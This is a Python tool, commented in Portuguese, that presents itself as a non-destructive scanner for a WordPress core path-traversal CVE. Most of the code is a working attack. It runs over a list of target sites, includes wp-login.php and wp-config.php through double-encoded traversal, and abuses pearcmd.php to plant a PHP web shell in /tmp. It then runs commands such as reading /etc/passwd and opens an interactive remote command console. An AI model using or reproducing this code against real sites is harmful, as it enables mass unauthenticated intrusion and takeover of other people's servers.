#!/usr/bin/env python3
"""
Scanner para CVE-2026-87902 (WordPress core - path traversal nao autenticado em
get_page_template(), CVSS 9.2, corrigido no WordPress 7.1.2).

Uso:
    python3 cve_2026_87902_scanner.py sites.txt
    python3 cve_2026_87902_scanner.py sites.txt -o resultado.json -t 10

Formato de sites.txt: uma URL por linha (com ou sem http(s)://).

Metodo de deteccao (nao destrutivo, baseado no template seguro publicado pela
Hadrian — nao explora a falha, apenas observa respostas):

  1. Confirmar que o site roda WordPress (meta generator, wp-content, rest-api).
  2. Requisicao de controle:  GET /?page_id=<id>            -> 200 com corpo.
  3. Controle negativo:       GET /?page_id=<id>&pagename=<traversal>/arquivo-inexistente
                              -> 200 com corpo (pagina renderizada normalmente).
  4. Sonda:                   GET /?page_id=<id>&pagename=<traversal>/index
                              -> se retornar 200 com corpo VAZIO, o servidor incluiu
                                 o index.php "Silence is golden" via traversal => VULNERAVEL.

Importante: o page_id precisa ser um ID de pagina publicada real. O scanner tenta
descobrir IDs validos automaticamente via a REST API; se nao conseguir, usa o
default (2).
"""

import argparse
import concurrent.futures
import http.client
import json
import re
import secrets
import ssl
import sys
from types import SimpleNamespace
from urllib.parse import urlparse

import requests

requests.packages.urllib3.disable_warnings()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; CVE-2026-87902-Scanner/1.0)",
    "Accept": "text/html,application/xhtml+xml",
}
TIMEOUT = 15

# Traversal duplo-encoded: templates/../../../index  ->  %252F = '/' duplo-encodado
TRAVERSAL = "templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F"
PROBE_FILE = "index"          # alvo da sonda (wp-content/index.php vazio)
NONEXISTENT = "index-cve-check-nonexistent"

# Versoes vulneraveis (fontes: Wordfence PSA, Hadrian, NVD/GHSA-7hp8-65ch-5whp):
# todas as versoes do WordPress core de 4.7.0 ate 7.1.1 (inclusive).
VULN_VERSION_RANGE = ("4.7.0", "7.1.1")

# Versoes corrigidas: 7.1.2 (branch atual) e os backports de seguranca
# lancados para as branches de suporte mais antigas.
FIXED_VERSIONS = ("7.1.2", "6.8.11", "6.7.3", "6.6.4", "6.5.7", "6.4.7",
                  "6.3.8", "6.2.9", "6.1.10", "6.0.10", "5.9.11", "5.8.11",
                  "5.7.13", "5.6.14", "5.5.15", "5.4.16", "5.3.18", "5.2.20",
                  "5.1.19", "5.0.22", "4.9.26", "4.8.25", "4.7.28")

# Explotacao conclusiva: wp-login.php existe em toda instalacao WordPress e,
# incluido via traversal, renderiza o formulario de login na URL da pagina
# frontal — prova de inclusao arbitrarria de arquivo PHP local (LFI).
EXPLOIT_FILE = "wp-login"
EXPLOIT_MARKERS = ("user_login", "wp-submit")
EXPLOIT_DEPTHS = (3, 4, 5, 6)  # niveis de ../ a partir de page-templates/

# Evidencia secundaria: incluir wp-config.php (executa silenciosamente, corpo
# vazio em HTTP 200) prova acesso a arquivo da raiz da instalacao.
WPCONFIG_FILE = "wp-config"

# ---- RCE (cadeia pearcmd) ----
# Condicao documentada (Wordfence): um .php "util quando incluido" legivel +
# register_argc_argv=On. A imagem oficial PHP/WordPress e cPanel pre-8.5 trazem
# /usr/local/lib/php/pearcmd.php nesse estado. O LFI inclui o pearcmd e os
# argumentos CGI (query string splitada por '+') fazem o config-create gravar
# um arquivo com payload controlado; um segundo include o executa.
PEARCMD_DEPTH = 7          # niveis '../' de <tema>/page-templates ate /
PEARCMD_RELPATH = "usr%252Flocal%252Flib%252Fphp%252Fpearcmd"
RCE_CMD = "id; head -3 /etc/passwd"


def raw_query_get(base: str, query: str, method: str = "GET"):
    """
    Envia a query string exatamente como recebida (byte a byte), sem
    re-codificacao — necessario porque o payload do pearcmd precisa chegar
    cru (<?= ... ?>) ao servidor. POST evita o redirect_canonical() que
    derruba o page_id em sites com permalinks bonitos.
    """
    u = urlparse(base)
    if u.scheme == "https":
        conn = http.client.HTTPSConnection(
            u.hostname, u.port or 443, timeout=TIMEOUT,
            context=ssl._create_unverified_context())
    else:
        conn = http.client.HTTPConnection(
            u.hostname, u.port or 80, timeout=TIMEOUT)
    conn.request(method, f"/?{query}", headers=HEADERS)
    resp = conn.getresponse()
    body = resp.read()
    conn.close()
    return resp, body


def exploit_rce(base: str, page_id: int, session: requests.Session) -> dict:
    """Cadeia completa CVE-2026-87902 -> RCE via pearcmd.php (2 requests)."""
    from urllib.parse import quote
    enc_up = "%252E%252E%252F"
    up = enc_up * PEARCMD_DEPTH
    # nome sem ponto inicial: a sanitizacao do pagename descarta pontos literais
    shell = f"/tmp/wp-{secrets.token_hex(4)}.php"
    payload = "<?=system($_GET[0])?>"

    # Passo 1: incluir pearcmd.php com argv CGI -> grava a shell em /tmp
    qs = (f"page_id={page_id}&pagename=templates%252F{up}{PEARCMD_RELPATH}"
          f"&+config-create+/&{payload}&+{shell}")
    try:
        _, body = raw_query_get(base, qs, method="POST")
    except OSError as e:
        return {"rce": False, "detalhe": f"falha ao contactar pearcmd: {e}"}
    if b"Successfully created" not in body:
        return {"rce": False,
                "detalhe": "pearcmd indisponivel ou register_argc_argv=Off "
                           "(resposta sem gravacao de arquivo)"}

    # Passo 2: incluir a shell e executar o comando
    qs = (f"page_id={page_id}&pagename=templates%252F{up}tmp%252F"
          f"{shell.rsplit('/', 1)[1].removesuffix('.php')}"
          f"&0={quote(RCE_CMD)}")
    try:
        _, body = raw_query_get(base, qs, method="POST")
    except OSError as e:
        return {"rce": False, "detalhe": f"falha ao incluir a shell: {e}"}

    m = re.search(rb"uid=\d+\([^\n]*", body)
    if m:
        return {
            "rce": True,
            "usuario": m.group(0).decode(errors="replace"),
            "shell": shell,
            "comando": RCE_CMD,
            "saida": body.decode(errors="replace")[:2000],
        }
    return {"rce": False, "detalhe": "shell gravada mas execucao nao confirmada",
            "saida": body.decode(errors="replace")[:500]}


def normalize_url(raw: str) -> str:
    raw = raw.strip()
    if not raw:
        return ""
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    return raw.rstrip("/")


def http_get(url: str, session: requests.Session) -> requests.Response | None:
    try:
        return session.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False,
                           allow_redirects=True)
    except requests.RequestException:
        return None


def http_post_query(base: str, params: dict, session: requests.Session) -> requests.Response | None:
    """
    POST para / com os mesmos parametros da query. POST evita o 301 do
    redirect_canonical() (que derruba o page_id em sites com pretty
    permalinks e impede o template de carregar).
    """
    try:
        return session.post(base + "/", data=params, headers=HEADERS,
                            timeout=TIMEOUT, verify=False, allow_redirects=False)
    except requests.RequestException:
        return None


def _post_page_ok(base: str, page_id: int, session: requests.Session) -> bool:
    r = http_post_query(base, {"page_id": str(page_id)}, session)
    return r is not None and r.status_code == 200 and len(r.content) > 100


def detect_wordpress(base: str, session: requests.Session) -> dict | None:
    """Retorna {'version': str|None} se o site for WordPress, senao None."""
    home = http_get(base, session)
    if home is None:
        return None

    markers = ("wp-content", "wp-includes", "/wp-json", "wp-json")
    version = None
    m = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"',
                  home.text, re.I)
    if m:
        version = m.group(1)
    is_wp = (m is not None
             or any(k in home.text for k in markers)
             or any(k in home.url for k in markers))
    if not is_wp:
        # fallback: REST API
        rest = http_get(base + "/wp-json/", session)
        if rest is not None and rest.status_code == 200 and "wp/json" in rest.headers.get("Content-Type", ""):
            is_wp = True
    return {"version": version} if is_wp else None


def find_valid_page_id(base: str, session: requests.Session) -> int:
    """
    Enumera um ID de pagina publicada por varias fontes:
    REST API, rest_route fallback, classe page-id-N no HTML, links ?page_id=,
    sitemap de paginas e probing direto de IDs baixos.
    """
    # 1. REST API
    rest = http_get(base + "/wp-json/wp/v2/pages?per_page=5&_fields=id", session)
    if rest is not None and rest.status_code == 200:
        try:
            data = rest.json()
            if isinstance(data, list) and data and "id" in data[0]:
                return int(data[0]["id"])
        except ValueError:
            pass

    # 2. REST via rest_route (quando /wp-json nao roteia)
    rest = http_get(base + "/?rest_route=/wp/v2/pages&per_page=5&_fields=id", session)
    if rest is not None and rest.status_code == 200:
        try:
            data = rest.json()
            if isinstance(data, list) and data and "id" in data[0]:
                return int(data[0]["id"])
        except ValueError:
            pass

    home = http_get(base, session)

    # 3. classe page-id-N no HTML (presente em page estatica como front ou link interno)
    if home is not None:
        m = re.search(r'class="[^"]*page-id-(\d+)', home.text)
        if m and _post_page_ok(base, int(m.group(1)), session):
            return int(m.group(1))

    # 4. links ?page_id= no HTML
    if home is not None:
        m = re.search(r'href="[^"]*\?page_id=(\d+)', home.text)
        if m and _post_page_ok(base, int(m.group(1)), session):
            return int(m.group(1))

    # 5. sitemap de paginas -> primeira URL -> page-id no HTML dela
    for sm in ("wp-sitemap-pages-1.xml", "sitemap_index.xml", "sitemap.xml"):
        r = http_get(f"{base}/{sm}", session)
        if r is None or r.status_code != 200:
            continue
        locs = re.findall(r"<loc>([^<]+)</loc>", r.text)
        for loc in locs[:5]:
            p = http_get(loc, session)
            if p is None:
                continue
            m = re.search(r'class="[^"]*page-id-(\d+)', p.text)
            if m and _post_page_ok(base, int(m.group(1)), session):
                return int(m.group(1))
        break

    # 6. probing direto de IDs baixos (Sample Page e vizinhos)
    for pid in (2, 3, 4, 5, 6):
        if _post_page_ok(base, pid, session):
            return pid

    return 2  # default do template


def probe_theme_page_dir(base: str, session: requests.Session) -> dict:
    """
    Verifica se o tema ativo tem diretorio top-level page-*, pre-condicao da
    CVE, distinguindo 403 de WAF de 403 de listagem proibida via controle de
    caminho inexistente.
    """
    home = http_get(base, session)
    if home is None:
        return {"tema": None, "page_dir": "inconclusivo"}
    m = re.search(r"wp-content/themes/([a-zA-Z0-9_-]+)/", home.text)
    if not m:
        return {"tema": None, "page_dir": "inconclusivo"}
    theme = m.group(1)

    ctrl = http_get(f"{base}/wp-content/themes/{theme}/xyz-não-existe-{secrets.token_hex(3)}/", session)
    probe = http_get(f"{base}/wp-content/themes/{theme}/page-templates/", session)
    if probe is None or ctrl is None:
        return {"tema": theme, "page_dir": "inconclusivo"}

    if probe.status_code == 200:
        status = "sim"
    elif probe.status_code in (403,) and ctrl.status_code == 404:
        # listagem proibida so no diretorio existente -> page-templates existe
        status = "sim"
    elif probe.status_code == ctrl.status_code:
        # mesmo codigo para existente e inexistente -> provavelmente sem o dir
        # (ou WAF cobrindo tudo — indistinguivel)
        status = "nao"
    else:
        status = "inconclusivo"
    return {"tema": theme, "page_dir": status}


def check_vulnerability(base: str, page_id: int, session: requests.Session) -> str:
    """
    Retorna: VULNERAVEL | NAO VULNERAVEL | INCONCLUSIVO
    Usa POST (evita o 301 do redirect_canonical, que derruba o page_id em
    sites com pretty permalinks), com fallback para GET.
    """
    payloads = {
        "control": f"page_id={page_id}",
        "neg": f"page_id={page_id}&pagename={TRAVERSAL}{NONEXISTENT}",
        "probe": f"page_id={page_id}&pagename={TRAVERSAL}{PROBE_FILE}",
    }

    def fetch(kind: str):
        """POST com query string crua (o requests form-encodaria o %25 do
        traversal); fallback GET se o POST redirecionar."""
        try:
            resp, body = raw_query_get(base, payloads[kind], method="POST")
        except OSError:
            return None
        if resp.status in (301, 302, 405):
            try:
                resp, body = raw_query_get(base, payloads[kind], method="GET")
            except OSError:
                return None
        return SimpleNamespace(status_code=resp.status, content=body)

    r1, r2, r3 = fetch("control"), fetch("neg"), fetch("probe")

    if r1 is None:
        return "INCONCLUSIVO (site inacessivel)"

    if r3 is not None and r3.status_code in (403, 405, 406, 429, 501):
        return "PROTEGIDO (WAF/firewall bloqueou a sonda de traversal)"

    if not (r2 and r3):
        return "INCONCLUSIVO (conexao dropada na sonda — provavel WAF)"

    ok1 = r1.status_code == 200 and len(r1.content) > 100
    ok2 = r2.status_code == 200 and len(r2.content) > 100
    probe_empty = r3.status_code == 200 and len(r3.content.strip()) == 0

    if ok1 and ok2 and probe_empty:
        return "VULNERAVEL"
    if ok1 and ok2 and not probe_empty:
        return "NAO VULNERAVEL"
    if r1.status_code in (301, 302) or r3.status_code in (301, 302):
        return "INCONCLUSIVO (redirect mesmo via POST — permalink agressivo)"
    if ok2 != ok1:
        return "INCONCLUSIVO (controles divergentes)"
    return ("INCONCLUSIVO (controles falharam — verifique se page_id="
            f"{page_id} corresponde a uma pagina publicada)")


def exploit_lfi(base: str, page_id: int, session: requests.Session) -> dict:
    """
    Exploracao conclusiva do CVE-2026-87902: inclui wp-login.php (arquivo PHP
    padrao de toda instalacao) via path traversal e verifica marcadores do
    formulario de login na resposta. Nao executa nenhuma acao destrutiva nem
    requer autenticacao.
    """
    enc_up = "%252E%252E%252F"  # '../' duplo-encodado
    evidencias = []

    # Evidencia 1: wp-login.php renderiza o formulario de login na pagina frontal
    for depth in EXPLOIT_DEPTHS:
        pagename = "templates%252F" + enc_up * depth + EXPLOIT_FILE
        url = f"{base}/?page_id={page_id}&pagename={pagename}"
        try:
            resp, body = raw_query_get(
                base, f"page_id={page_id}&pagename={pagename}", method="POST")
        except OSError:
            continue
        if resp.status == 200:
            found = [m for m in EXPLOIT_MARKERS if m.encode() in body]
            # o corpo precisa ser o login renderizado, nao a pagina normal
            if found and len(body) < 15000:
                evidencias.append(
                    f"wp-login.php incluido via traversal (marcadores: "
                    f"{', '.join(found)}; {len(body)} bytes retornados na URL "
                    f"da pagina) — payload: {url}")
                login_depth = depth
                break
    else:
        login_depth = None

    # Evidencia 2: wp-config.php incluido da raiz da instalacao (executa
    # silenciosamente: HTTP 200 com corpo vazio, sem a pagina normal)
    wpconfig = None
    if login_depth is not None:
        pagename = "templates%252F" + enc_up * login_depth + WPCONFIG_FILE
        url = f"{base}/?page_id={page_id}&pagename={pagename}"
        try:
            resp, body = raw_query_get(
                base, f"page_id={page_id}&pagename={pagename}", method="POST")
            if resp.status == 200 and len(body.strip()) == 0:
                wpconfig = url
                evidencias.append(
                    "wp-config.php incluido da raiz da instalacao e executado "
                    f"silenciosamente (HTTP 200, corpo vazio) — payload: {url}")
        except OSError:
            pass

    if evidencias:
        return {"explorado": True, "evidencia": " | ".join(evidencias),
                "wp_config_executado": wpconfig is not None}
    return {"explorado": False, "evidencia": "inclusao de wp-login.php nao confirmada",
            "wp_config_executado": False}


def version_tuple(v: str) -> tuple:
    return tuple(int(p) for p in v.split("."))


def assess_version(version: str) -> str | None:
    """
    Avalia a versao declarada contra o intervalo vulneravel e os backports
    corrigidos. Retorna um sinal textual ou None se a versao for desconhecida.
    """
    try:
        v = version_tuple(version)
    except ValueError:
        return None
    if v in map(version_tuple, FIXED_VERSIONS):
        return "versao corrigida (patch/backport aplicado)"
    if version_tuple(VULN_VERSION_RANGE[0]) <= v <= version_tuple(VULN_VERSION_RANGE[1]):
        return "versao DENTRO do intervalo vulneravel (4.7.0–7.1.1)"
    return "versao fora do intervalo vulneravel"


def scan_site(raw_url: str, exploit: bool = False, rce: bool = False) -> dict:
    result = {"site": raw_url, "wordpress": False, "versao": None,
              "status_cve_2026_87902": "N/A", "detalhe": "",
              "exploracao": None, "rce": None}
    base = normalize_url(raw_url)
    if not base:
        result["detalhe"] = "URL vazia"
        return result

    session = requests.Session()
    wp = detect_wordpress(base, session)
    if wp is None:
        code = None
        probe = http_get(base, session)
        if probe is not None:
            code = probe.status_code
        result["detalhe"] = f"Nao parece ser WordPress (HTTP {code})"
        return result

    result["wordpress"] = True
    result["versao"] = wp["version"]

    if wp["version"]:
        # sinal adicional baseado em versao declarada
        sinal = assess_version(wp["version"])
        print(f"    [i] WordPress {wp['version']} declarado em {raw_url}"
              + (f" — {sinal}" if sinal else ""))
        result["sinal_versao"] = sinal

    page_id = find_valid_page_id(base, session)
    theme = probe_theme_page_dir(base, session)
    result["tema"] = theme["tema"]
    result["page_dir"] = theme["page_dir"]

    status = check_vulnerability(base, page_id, session)

    if status == "NAO VULNERAVEL" and theme["page_dir"] == "nao":
        status = ("INCONCLUSIVO (tema sem diretorio page-* — negativa nao "
                  "conclusiva)")

    result["status_cve_2026_87902"] = status
    result["detalhe"] = (f"page_id testado: {page_id}; tema: "
                         f"{theme['tema'] or '?'} (page-dir: {theme['page_dir']})")
    result["page_id"] = page_id

    if exploit and status == "VULNERAVEL":
        result["exploracao"] = exploit_lfi(base, page_id, session)
    if rce and status == "VULNERAVEL":
        result["rce"] = exploit_rce(base, page_id, session)
    return result


def run_console(base: str, page_id: int, shell: str) -> None:
    """
    Console interativo sobre a shell gravada via pearcmd: cada comando digitado
    e executado num GET (include via traversal + parametro 0). Sai com 'exit'
    (remove a shell do servidor) ou Ctrl+C.
    """
    from urllib.parse import quote
    enc_up = "%252E%252E%252F"
    shell_name = shell.rsplit("/", 1)[1].removesuffix(".php")
    pagename = f"templates%252F{enc_up * PEARCMD_DEPTH}tmp%252F{shell_name}"

    def executar(cmd: str) -> str:
        delimited = f"echo __OUT__; {cmd}; echo __END__"
        qs = f"page_id={page_id}&pagename={pagename}&0={quote(delimited)}"
        _, body = raw_query_get(base, qs, method="POST")
        m = re.search(rb"__OUT__\n(.*?)__END__", body, re.S)
        return m.group(1).decode(errors="replace") if m else \
            body.decode(errors="replace")[:800]

    print(f"\n[*] Console RCE em {base} (shell: {shell})")
    print("[*] Digite comandos; 'exit' sai e remove a shell do servidor.\n")
    while True:
        try:
            cmd = input("rce> ").strip()
        except (EOFError, KeyboardInterrupt):
            cmd = "exit"
        if not cmd:
            continue
        if cmd == "exit":
            executar(f"rm -f {shell}")
            print(f"[*] Shell {shell} removida. Saindo.")
            return
        print(executar(cmd), end="" if cmd.endswith("\n") else "\n")


def main():
    ap = argparse.ArgumentParser(
        description="Scanner CVE-2026-87902 (WordPress path traversal, pre-auth)")
    ap.add_argument("lista", help="arquivo com uma URL por linha")
    ap.add_argument("-o", "--output", help="salvar resultado em JSON")
    ap.add_argument("-t", "--threads", type=int, default=5,
                    help="numero de threads (default: 5)")
    ap.add_argument("--exploit", action="store_true",
                    help="explorar sites confirmados como vulneraveis (PoC LFI "
                         "inclusivo e nao destrutivo: inclui wp-login.php)")
    ap.add_argument("--rce", action="store_true",
                    help="tentar RCE completo via cadeia pearcmd (grava e executa "
                         "shell em /tmp do servidor alvo)")
    ap.add_argument("--console", action="store_true",
                    help="apos RCE bem-sucedido, abre console interativo de "
                         "comandos na shell (implica uso com --rce)")
    args = ap.parse_args()
    if args.console:
        args.rce = True

    try:
        with open(args.lista, encoding="utf-8") as f:
            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except OSError as e:
        sys.exit(f"Erro ao ler a lista: {e}")

    if not sites:
        sys.exit("Lista vazia.")

    fixed_list = ", ".join(FIXED_VERSIONS[:4]) + ", ..."
    print(f"[*] Escaneando {len(sites)} site(s) para CVE-2026-87902 "
          f"(afeta WP {VULN_VERSION_RANGE[0]}–{VULN_VERSION_RANGE[1]}, "
          f"corrigido em: {fixed_list})\n")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(scan_site, s, args.exploit, args.rce): s for s in sites}
        for fut in concurrent.futures.as_completed(futs):
            res = fut.result()
            results.append(res)
            wp = "WordPress" if res["wordpress"] else "nao-WP"
            ver = f" v{res['versao']}" if res["versao"] else ""
            print(f"  [{res['status_cve_2026_87902']}] {res['site']}  ({wp}{ver})")
            if res["detalhe"]:
                print(f"        -> {res['detalhe']}")
            if res.get("exploracao"):
                ex_ = res["exploracao"]
                tag = "EXPLORADO" if ex_["explorado"] else "NAO EXPLORADO"
                print(f"        [{tag}] {ex_['evidencia']}")
                if ex_["explorado"]:
                    print(f"        wp-config.php executado: "
                          f"{'sim' if ex_['wp_config_executado'] else 'nao'}")
            if res.get("rce"):
                rx = res["rce"]
                if rx["rce"]:
                    print(f"        [RCE] executado como: {rx['usuario']}")
                    print(f"        comando: {rx['comando']}")
                    print(f"        shell gravada em: {rx['shell']}")
                else:
                    print(f"        [RCE FALHOU] {rx['detalhe']}")

    vuln = sum(1 for r in results if r["status_cve_2026_87902"] == "VULNERAVEL")
    expl = sum(1 for r in results if (r.get("exploracao") or {}).get("explorado"))
    rced = sum(1 for r in results if (r.get("rce") or {}).get("rce"))
    wp_count = sum(1 for r in results if r["wordpress"])
    print(f"\n[*] Resumo: {wp_count} WordPress | {vuln} vulneravel(is) | "
          f"{expl} explorado(s) | {rced} com RCE | "
          f"{len(results) - wp_count} nao-WordPress")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"[*] Resultado salvo em {args.output}")

    if args.console:
        for res in results:
            rx = res.get("rce")
            if rx and rx.get("rce"):
                run_console(normalize_url(res["site"]), res["page_id"],
                            rx["shell"])


if __name__ == "__main__":
    main()
